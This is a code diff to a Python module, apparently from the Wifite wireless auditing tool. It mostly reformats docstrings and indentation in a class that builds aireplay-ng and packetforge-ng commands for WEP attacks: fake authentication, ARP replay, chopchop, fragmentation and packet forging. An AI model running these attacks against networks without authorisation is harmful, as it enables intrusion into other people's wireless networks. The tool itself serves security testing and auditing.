@@ -13,7 +13,7 @@ from threading import Thread
 
 
 class WEPAttackType(object):
-    ''' Enumeration of different WEP attack types '''
+    """ Enumeration of different WEP attack types """
     fakeauth = 0
     replay = 1
     chopchop = 2
@@ -24,12 +24,12 @@ class WEPAttackType(object):
     forgedreplay = 7
 
     def __init__(self, var):
-        '''
+        """
             Sets appropriate attack name/value given an input.
             Args:
                 var - Can be a string, number, or WEPAttackType object
                       This object's name & value is set depending on var.
-        '''
+        """
         self.value = None
         self.name = None
         if type(var) is int:
@@ -64,41 +64,43 @@ class Aireplay(Thread, Dependency):
     dependency_url = 'https://www.aircrack-ng.org/install.html'
 
     def __init__(self, target, attack_type, client_mac=None, replay_file=None):
-        '''
+        """
             Starts aireplay process.
             Args:
                 target - Instance of Target object, AP to attack.
                 attack_type - str, e.g. 'fakeauth', 'arpreplay', etc.
                 client_mac - MAC address of an associated client.
-        '''
+        """
         super(Aireplay, self).__init__()  # Init the parent Thread
 
-        self.target = target
-        self.output_file = Configuration.temp('aireplay_%s.output'
-            % attack_type)
-        self.attack_type = WEPAttackType(attack_type).value
         self.error = None
         self.status = None
+        self.stdout = None
+        self.xor_percent = None
+
+        self.target = target
+        self.output_file = Configuration.temp('aireplay_%s.output' % attack_type)
+        self.attack_type = WEPAttackType(attack_type).value
         self.cmd = Aireplay.get_aireplay_command(self.target,
-                                            attack_type,
-                                            client_mac=client_mac,
-                                            replay_file=replay_file)
+                                                 attack_type,
+                                                 client_mac=client_mac,
+                                                 replay_file=replay_file)
         self.pid = Process(self.cmd,
-                stdout=open(self.output_file, 'a'),
-                stderr=Process.devnull(),
-                cwd=Configuration.temp())
+                           stdout=open(self.output_file, 'a'),
+                           stderr=Process.devnull(),
+                           cwd=Configuration.temp())
         self.start()
 
     def is_running(self):
         return self.pid.poll() is None
 
     def stop(self):
-        ''' Stops aireplay process '''
+        """ Stops aireplay process """
         if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:
             self.pid.interrupt()
 
     def get_output(self):
-        ''' Returns stdout from aireplay process '''
+        """ Returns stdout from aireplay process """
         return self.stdout
 
     def run(self):
@@ -120,7 +122,7 @@ class Aireplay(Thread, Dependency):
                 Color.pl('\n{P} [?] aireplay output:\n     %s{W}' % lines.strip().replace('\n', '\n     '))
 
             for line in lines.split('\n'):
-                line=line.replace('\r', '').strip()
+                line = line.replace('\r', '').strip()
                 if line == '':
                     continue
                 if 'Notice: got a deauth/disassoc packet' in line:
@@ -226,7 +228,8 @@ class Aireplay(Thread, Dependency):
                     # Parse Packets Sent & PacketsPerSecond. Possible output lines:
                     # Read 55 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
                     # Read 4467 packets (got 1425 ARP requests and 1417 ACKs), sent 1553 packets...(100 pps)
-                    read_re = re.compile(r'Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)')
+                    read_re = re.compile(
+                        r'Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)')
                     matches = read_re.match(line)
                     if matches:
                         pps = matches.group(5)
@@ -240,24 +243,22 @@ class Aireplay(Thread, Dependency):
         self.stop()
 
     @staticmethod
-    def get_aireplay_command(target, attack_type,
-        client_mac=None, replay_file=None): 
-        '''
+    def get_aireplay_command(target, attack_type, client_mac=None, replay_file=None):
+        """
             Generates aireplay command based on target and attack type
             Args:
                 target      - Instance of Target object, AP to attack.
                 attack_type - int, str, or WEPAttackType instance.
                 client_mac  - MAC address of an associated client.
                 replay_file - .Cap file to replay via --arpreplay
-        '''
+        """
 
         # Interface is required at this point
         Configuration.initialize()
         if Configuration.interface is None:
             raise Exception('Wireless interface must be defined (-i)')
 
-        cmd = ['aireplay-ng']
-        cmd.append('--ignore-negative-one')
+        cmd = ['aireplay-ng', '--ignore-negative-one']
 
         if client_mac is None and len(target.clients) > 0:
             # Client MAC wasn't specified, but there's an associated client. Use that.
@@ -291,7 +292,7 @@ class Aireplay(Thread, Dependency):
                 '-x', str(Configuration.wep_pps),
                 # '-m', '60', # Minimum packet length (bytes)
                 # '-n', '82', # Maximum packet length
-                '-F'        # Automatically choose first packet
+                '-F'  # Automatically choose first packet
             ])
             if client_mac:
                 cmd.extend(['-h', client_mac])
@@ -302,7 +303,7 @@ class Aireplay(Thread, Dependency):
                 '-b', target.bssid,
                 '-x', str(Configuration.wep_pps),
                 '-m', '100',  # Minimum packet length (bytes)
-                '-F'          # Automatically choose first packet
+                '-F'  # Automatically choose first packet
             ])
             if client_mac:
                 cmd.extend(['-h', client_mac])
@@ -356,28 +357,28 @@ class Aireplay(Thread, Dependency):
 
     @staticmethod
     def get_xor():
-        ''' Finds the last .xor file in the directory '''
+        """ Finds the last .xor file in the directory """
         xor = None
         for fil in os.listdir(Configuration.temp()):
             if fil.startswith('replay_') and fil.endswith('.xor') or \
-               fil.startswith('fragment-') and fil.endswith('.xor'):
+                    fil.startswith('fragment-') and fil.endswith('.xor'):
                 xor = fil
         return xor
 
     @staticmethod
     def forge_packet(xor_file, bssid, station_mac):
-        ''' Forges packet from .xor file '''
+        """ Forges packet from .xor file """
         forged_file = 'forged.cap'
         cmd = [
             'packetforge-ng',
-                '-0',
-                '-a', bssid,            # Target MAC
-                '-h', station_mac,      # Client MAC
-                '-k', '192.168.1.2',    # Dest IP
-                '-l', '192.168.1.100',  # Source IP
-                '-y', xor_file,         # Read PRNG from .xor file
-                '-w', forged_file,      # Write to
-                Configuration.interface
+            '-0',
+            '-a', bssid,  # Target MAC
+            '-h', station_mac,  # Client MAC
+            '-k', '192.168.1.2',  # Dest IP
+            '-l', '192.168.1.100',  # Source IP
+            '-y', xor_file,  # Read PRNG from .xor file
+            '-w', forged_file,  # Write to
+            Configuration.interface
         ]
 
         cmd = '"%s"' % '" "'.join(cmd)
@@ -415,7 +416,7 @@ class Aireplay(Thread, Dependency):
 
     @staticmethod
     def fakeauth(target, timeout=5, num_attempts=3):
-        '''
+        """
         Tries a one-time fake-authenticate with a target AP.
         Params:
             target (py.Target): Instance of py.Target
@@ -423,7 +424,7 @@ class Aireplay(Thread, Dependency):
             num_attempts (int): Number of fakeauth attempts to make.
         Returns:
             (bool): True if fakeauth succeeds, otherwise False
-        '''
+        """
 
         cmd = [
             'aireplay-ng',
@@ -435,8 +436,8 @@ class Aireplay(Thread, Dependency):
             cmd.extend(['-e', target.essid])
         cmd.append(Configuration.interface)
         fakeauth_proc = Process(cmd,
-                devnull=False,
-                cwd=Configuration.temp())
+                                devnull=False,
+                                cwd=Configuration.temp())
 
         timer = Timer(timeout)
         while fakeauth_proc.poll() is None and not timer.ended():
